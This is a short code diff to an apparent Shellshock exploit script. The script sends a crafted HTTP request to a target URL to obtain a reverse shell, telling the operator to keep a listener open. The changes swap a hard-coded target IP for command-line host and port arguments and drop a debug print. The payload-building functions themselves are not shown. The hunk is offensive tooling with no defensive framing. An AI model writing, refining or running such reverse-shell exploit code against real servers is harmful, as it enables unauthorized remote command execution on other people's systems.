@@ -48,14 +48,14 @@ def shellshock_rev_payloads(lhost, lport, target_url):
 def main():
     lhost = sys.argv[1]
     lport = int(sys.argv[2])
+    rhost = sys.argv[3]
+    rport = int(sys.argv[4])
     ''' We get this URL from the shellshock_dect tool '''
-    target_url = sys.argv[3]
+    target_url = sys.argv[5]
     print("Shellshock attack tool")
     print("Sending payload\nEnsure to have a listener open on {}".format(lport))
     # This is what we pass into the HEAD request which actually performs shellshock
-    payload = shellshock_http_req(lhost,lport,'192.168.0.100', 80, target_url)
-    print(payload)
-
+    payload = shellshock_http_req(lhost,lport,rhost, rport, target_url)
 
     #Just a GET request ATM. Needs to have a socket attached
     #result = shellshock_rev_payloads(lhost, lport, target_url)
